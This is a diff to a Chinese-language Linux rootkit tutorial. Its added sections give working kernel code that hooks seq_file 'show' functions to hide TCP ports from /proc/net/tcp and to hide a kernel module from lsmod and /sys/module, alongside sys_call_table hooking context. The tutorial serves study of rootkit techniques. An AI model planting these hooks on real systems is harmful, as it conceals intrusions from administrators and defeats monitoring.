@@ -22,7 +22,8 @@ rectigu@gmail.com, 二〇一六年五月。
 代码仓库： https://github.com/NoviceLive/research-rootkit 。
 代码在最新的 64 比特 Arch_ 与 Kali_ 上面测试正常。
 
-测试建议： **不要在物理机测试！不要在物理机测试！不要在物理机测试！**
+测试建议： **不要在物理机测试！不要在物理机测试！
+不要在物理机测试！**
 
 如果读者使用 tmux_ 或者类似的工具，
 则可以垂直分割你的终端窗口，
@@ -34,7 +35,8 @@ rectigu@gmail.com, 二〇一六年五月。
 第一部分：基于修改 `sys_call_table`_ 的系统调用挂钩
 ---------------------------------------------------
 
-在系统调用挂钩技术中，最简单、最流行的方案是修改 `sys_call_table`_ ，
+在系统调用挂钩技术中，最简单、最流行的方案是修改
+`sys_call_table`_ ，
 成员类型为函数指针的一维数组。
 
 .. code-block:: c
@@ -64,7 +66,8 @@ rectigu@gmail.com, 二〇一六年五月。
 `Hooking the Linux System Call Table`_ ，
 这篇文章便是使用这种方案来获取 `sys_call_table`_ 的地址的。
 
-二，从使用了 `sys_call_table`_ 的某些未导出函数的机器码里面进行特征搜索，
+二，从使用了 `sys_call_table`_
+的某些未导出函数的机器码里面进行特征搜索，
 感兴趣的读者可以查阅
 `Kernel-Land Rootkits`_ ，
 作者花了几张 slides
@@ -95,7 +98,8 @@ rectigu@gmail.com, 二〇一六年五月。
    }
 
 `PAGE_OFFSET`_ 是内核内存空间的起始地址。
-因为 `sys_close`_ 是导出函数（需要指出的是， ``sys_open`` 、 ``sys_read`` 等并不是导出的），
+因为 `sys_close`_ 是导出函数
+（需要指出的是， ``sys_open`` 、 ``sys_read`` 等并不是导出的），
 我们可以直接得到他的地址；因为系统调用号
 （也就是 `sys_call_table`_ 这个一维数组的索引）
 在同一 ABI_ （x86 跟 x64 不是同一 ABI）上具有高度的后向兼容性，
@@ -173,7 +177,8 @@ rectigu@gmail.com, 二〇一六年五月。
 3. 修改 `sys_call_table`_
 +++++++++++++++++++++++++
 
-一维数组赋值，当之无愧最简单的方案。当然，我们需要先把真正的值保存好，以备后面之需。
+一维数组赋值，当之无愧最简单的方案。
+当然，我们需要先把真正的值保存好，以备后面之需。
 
 .. code-block:: c
 
@@ -323,7 +328,8 @@ rectigu@gmail.com, 二〇一六年六月。
 本文所需的完整代码位于笔者的代码仓库：
 https://github.com/NoviceLive/research-rootkit。
 
-测试建议： **不要在物理机测试！不要在物理机测试！不要在物理机测试！**
+测试建议： **不要在物理机测试！不要在物理机测试！
+不要在物理机测试！**
 
 概要
 ----
@@ -395,7 +401,7 @@ Rootkit 必备的基本功能，
 是一个过时了的 API_ ，而且在新内核里面它已经被去掉了。
 考虑到笔者暂时还不考虑兼容老的内核，
 所以我们直接用新的 API_ ， ``proc_create`` 与 ``proc_remove`` ，
-分别用创建与删除一个 `/proc`_ 下面的项目。
+分别用于创建与删除一个 `/proc`_ 下面的项目。
 
 函数原型如下。
 
@@ -974,19 +980,313 @@ systemd_ 就显示出来了。
 把需要隐藏的的端口的内容过滤掉，
 使得用户进程读到的内容里面没有我们想隐藏的端口。
 
-具体说来，
-TCP_ / IPv4_ 的连接信息位于 ``/proc/net/tcp`` ，
-IPv6_ 是 ``/proc/net/tcp6`` ；
-UDP_ / IPv4_ 是 ``/proc/net/udp`` ， IPv6_ 是 ``/proc/net/udp6`` 。
+具体说来，看下面的表格。
 
-这些文件的第一行是每一列的含义，
+============  ==================  =======================  =================
+网络类型      `/proc`_ 文件       内核源码文件             主要实现函数
+------------  ------------------  -----------------------  -----------------
+TCP_ / IPv4_  ``/proc/net/tcp``   ``net/ipv4/tcp_ipv4.c``  ``tcp4_seq_show``
+------------  ------------------  -----------------------  -----------------
+TCP_ / IPv6_  ``/proc/net/tcp6``  ``net/ipv6/tcp_ipv6.c``  ``tcp6_seq_show``
+------------  ------------------  -----------------------  -----------------
+UDP_ / IPv4_  ``/proc/net/udp``   ``net/ipv4/udp.c``       ``udp4_seq_show``
+------------  ------------------  -----------------------  -----------------
+UDP_ / IPv6_  ``/proc/net/udp6``  ``net/ipv6/udp.c``       ``udp6_seq_show``
+============  ==================  =======================  =================
+
+本小节以 TCP_ / IPv4_ 为例，其他情况读者可举一反三。
+
+文件的第一行是每一列的含义，
 后面的行就是当前网络连接（ socket_ / 套接字）的具体信息。
-这些信息是通过 ``seq_file`` 机制 在 ``/proc`` 中暴露的。
+这些信息是通过 ``seq_file`` 接口在 ``/proc`` 中暴露的。
+``seq_file`` 拥有的操作函数如下，我们需要关心是 ``show`` 。
 
+.. code-block:: c
+
+   struct seq_operations {
+   	void * (*start) (struct seq_file *m, loff_t *pos);
+   	void (*stop) (struct seq_file *m, void *v);
+   	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+   	int (*show) (struct seq_file *m, void *v);
+   };
+
+
+前面我们提到了隐藏端口也就是在进程读取 ``/proc/net/tcp`` 等文件
+获取端口信息时过滤掉不希望让进程看到的内容，具体来讲，
+就是将 ``/proc/net/tcp`` 等文件的 ``show``
+函数篡改成我们的钩子函数，
+然后在我们的假 ``show`` 函数里进行过滤。
+
+我们先看看用来描述 ``seq_file`` 的结构体，即 ``struct seq_file`` ，
+定义于 ``linux/seq_file.h`` 。
+``seq_file`` 有一个缓冲区，也就是 ``buf`` 成员，
+容量是 ``size`` ，已经使用的量是 ``count`` ；
+理解了这几个成员的作用就能理解用于过滤端口信息的假
+``tcp_seq_show`` 了。
+
+.. code-block:: c
+
+   struct seq_file {
+   	char *buf; // 缓冲区。
+   	size_t size; // 缓冲区容量。
+   	size_t from;
+   	size_t count; // 缓冲区已经使用的量。
+   	size_t pad_until;
+   	loff_t index;
+   	loff_t read_pos;
+   	u64 version;
+   	struct mutex lock;
+   	const struct seq_operations *op;
+   	int poll_event;
+   	const struct file *file;
+   	void *private;
+   };
+
+钩 ``/proc/net/tcp`` 等文件的 ``show``
+函数的方法与之前讲隐藏文件钩 ``iterate`` 的方法类似，
+用下面的宏可以通用的钩这几个文件 ``seq_file`` 接口里面的操作函数。
+
+.. code-block:: c
+
+   # define set_afinfo_seq_op(op, path, afinfo_struct, new, old)   \
+       do {                                                        \
+           struct file *filp;                                      \
+           afinfo_struct *afinfo;                                  \
+                                                                   \
+           filp = filp_open(path, O_RDONLY, 0);                    \
+           if (IS_ERR(filp)) {                                     \
+               fm_alert("Failed to open %s with error %ld.\n",     \
+                        path, PTR_ERR(filp));                      \
+               old = NULL;                                         \
+           }                                                       \
+                                                                   \
+           afinfo = PDE_DATA(filp->f_path.dentry->d_inode);        \
+           old = afinfo->seq_ops.op;                               \
+           fm_alert("Setting seq_op->" #op " from %p to %p.",      \
+                    old, new);                                     \
+           afinfo->seq_ops.op = new;                               \
+                                                                   \
+           filp_close(filp, 0);                                    \
+       } while (0)
+
+最后，我们看看假 ``show`` 函数是如何过滤掉端口信息的。
+
+**注1** ： ``TMPSZ`` 是 150，内核源码里是这样定义的。
+换句话说，``/proc/net/tcp``
+里的每一条记录都是 149 个字节（不算换行）长，
+不够的用空格补齐。
+
+**注2** ： 我们不用 ``TMPSZ`` 也可以，并且会更加灵活，
+具体细节请看下面隐藏内核模块时
+``/proc/modules`` 的假 ``show`` 函数是怎么处理的。
+
+.. code-block:: c
+
+   int
+   fake_seq_show(struct seq_file *seq, void *v)
+   {
+       int ret;
+       char needle[NEEDLE_LEN];
+
+       // 把端口转换成 16 进制，前面带个分号，避免误判。
+       // 用来判断这项记录是否需要过滤掉。
+       snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
+       // real_seq_show 会往 buf 里填充一项记录
+       ret = real_seq_show(seq, v);
+
+       // 该项记录的起始 = 缓冲区起始 + 已有量 - 每条记录的大小。
+       if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
+           fm_alert("Hiding port %d using needle %s.\n",
+                    SECRET_PORT, needle);
+           // 记录里包含我们需要隐藏的的端口信息，
+           // 把 count 减掉一个记录大小，
+           // 相当于把这个记录去除掉了。
+           seq->count -= TMPSZ;
+       }
+
+       return ret;
+   }
+
+实验
+****
+
+我们拿 TCP_ / IPv4_ 111 端口来做演示，
+读者需要根据实际测试时的环境做必要改动。
+如图，加载 ``pthidko`` 之前，我们可以看到 111 端口处于监听状态；
+加载之后，这条记录不见了，被隐藏起来；
+把 ``pthidko`` 卸载掉，这条记录又显示出来了。
+
+.. image:: images/pthid.png
 
 6. 隐藏内核模块
 +++++++++++++++
 
+`《Linux Rootkit 系列一： LKM 的基础编写及隐藏》`_
+一文里提到了隐藏内核模块的两种方式，
+一种可以从 ``lsmod`` 中隐藏掉，
+另一种可以从 ``/sys/module`` 里隐藏掉。
+然而，这两种隐藏方式都使得模块没法卸载了。
+在我们开发的初级阶段，这一点也不方便调试，笔者暂时就不讲这两个了。
+
+我们看看另外的思路。从 ``/sys/module`` 里隐藏的话，
+我们使用之前隐藏文件的方式隐藏掉就可以了。
+我想聪明的读者应该想到了这点，这再一次证明了文件隐藏的意义。
+
+那么怎么从 ``lsmod`` 里隐藏掉呢。
+仔细回想一下，既然 ``lsmod`` 的数据来源是 ``/proc/modules`` ，
+那用我们隐藏端口时采用的方式就好了：
+钩掉 ``/proc/modules`` 的 ``show`` 函数，
+在我们的假 ``show`` 函数里过滤掉我们想隐藏的模块。
+
+粗略地浏览内核源码，我们可以发现，
+``/proc/modules`` 的实现位于 ``kernel/module.c`` ，
+并且主要的实现函数是 ``m_show`` 。
+
+接下来的问题是，
+我们怎么钩这个文件 ``seq_file`` 接口里的 ``show`` 函数呢，
+钩法与 ``/proc/net/tcp`` 并不一样，但是类似，请看下面的宏。
+
+.. code-block:: c
+
+   # define set_file_seq_op(opname, path, new, old)                    \
+       do {                                                            \
+           struct file *filp;                                          \
+           struct seq_file *seq;                                       \
+           struct seq_operations *seq_op;                              \
+                                                                       \
+           fm_alert("Opening the path: %s.\n", path);                  \
+           filp = filp_open(path, O_RDONLY, 0);                        \
+           if (IS_ERR(filp)) {                                         \
+               fm_alert("Failed to open %s with error %ld.\n",         \
+                        path, PTR_ERR(filp));                          \
+               old = NULL;                                             \
+           } else {                                                    \
+               fm_alert("Succeeded in opening: %s\n", path);           \
+               seq = (struct seq_file *)filp->private_data;            \
+               seq_op = (struct seq_operations *)seq->op;              \
+               old = seq_op->opname;                                   \
+                                                                       \
+               fm_alert("Changing seq_op->"#opname" from %p to %p.\n", \
+                        old, new);                                     \
+               disable_write_protection();                             \
+               seq_op->opname = new;                                   \
+               enable_write_protection();                              \
+           }                                                           \
+       } while (0)
+
+这个宏与之前写的宏非常类似，唯一的不同，
+并且读者可能不能理解的是下面这一行。
+
+.. code-block:: c
+
+   seq = (struct seq_file *)filp->private_data;
+
+我想，读者的问题应该是：
+``struct file`` 的 ``private_data`` 成员为什么会是我们要找的
+``struct seq_file`` 指针？
+
+请看内核源码。下面的片段是 ``/proc/modules`` 的初始部分，
+我们想要做的是钩掉 ``m_show`` 。
+纵观源码，引用了 ``modules_op`` 的只有 ``seq_open`` 。
+
+.. code-block:: c
+
+   static const struct seq_operations modules_op = {
+   	.start	= m_start,
+   	.next	= m_next,
+   	.stop	= m_stop,
+   	.show	= m_show
+   };
+
+   static int modules_open(struct inode *inode, struct file *file)
+   {
+   	return seq_open(file, &modules_op);
+   }
+
+那我们跟进 ``seq_open`` 看看，
+seq_open 的实现位于 ``fs/seq_file.c`` 。
+
+
+::
+
+   int seq_open(struct file *file, const struct seq_operations *op)
+   {
+   	struct seq_file *p;
+
+   	WARN_ON(file->private_data);
+
+        // 分配一个 ``struct seq_file`` 的 内存。
+   	p = kzalloc(sizeof(*p), GFP_KERNEL);
+   	if (!p)
+   		return -ENOMEM;
+
+        // 读者看到这一行应该就能理解了。
+        // 对 ``/proc/modules`` 而言，
+        // ``struct file`` 的 ``private_data`` 指向的就是
+        // 他的 ``struct seq_file``。
+   	file->private_data = p;
+
+   	mutex_init(&p->lock);
+        // 把 ``struct seq_file`` 的 ``op`` 成员赋值成 ``op``，
+        // 这个 ``op`` 里就包含了我们要钩的 ``m_show`` 。
+   	p->op = op;
+
+        // 这儿省略若干代码。
+
+   	return 0;
+   }
+
+这时候，我们可以看看 ``/proc/modules`` 的假 ``show`` 函数了。
+过滤逻辑是很容易理解的；
+读者应该重点注意一下 ``last_size`` 的计算，
+这也就是笔者在讲端口隐藏时说到我们可以不用 TMPSZ ，
+我们可以自己计算这一条记录的大小。
+自己计算的灵活性就在于，就算每个记录的大小不是同样长的，
+我们的代码也能正常工作。
+
+**注** ： ``/proc/modules`` 里的每条记录长度确实不是一样，有长有短。
+
+.. code-block:: c
+
+   int
+   fake_seq_show(struct seq_file *seq, void *v)
+   {
+       int ret;
+       size_t last_count, last_size;
+
+       // 保存一份 ``count`` 值，
+       // 下面的 ``real_seq_show`` 会往缓冲区里填充一条记录，
+       // 添加完成后，seq->count 也会增加。
+       last_count = seq->count;
+       ret =  real_seq_show(seq, v);
+
+       // 填充记录之后的 count 减去填充之前的 count
+       // 就可以得到填充的这条记录的大小了。
+       last_size = seq->count - last_count;
+
+       if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULE,
+                   last_size)) {
+           // 是需要隐藏的模块，
+           // 把缓冲区已经使用的量减去这条记录的长度，
+           // 也就相当于把这条记录去掉了。
+           fm_alert("Hiding module: %s\n", SECRET_MODULE);
+           seq->count -= last_size;
+       }
+
+       return ret;
+   }
+
+实验
+****
+
+我们选择隐藏模块自己（ ``kohidko`` ）来做演示。看下图。
+加载 ``kohidko`` 之后，
+``lsmod`` 没有显示出我们的模块，
+``/sys/module`` 下面也列举不到我们的模块；
+并且，右侧 ``dmesg`` 的日志也表明我们的假 ``filldir`` 与假 ``show``
+函数起了作用。
+
+.. image:: images/kohid.png
 
 第二部分：未来展望
 ------------------
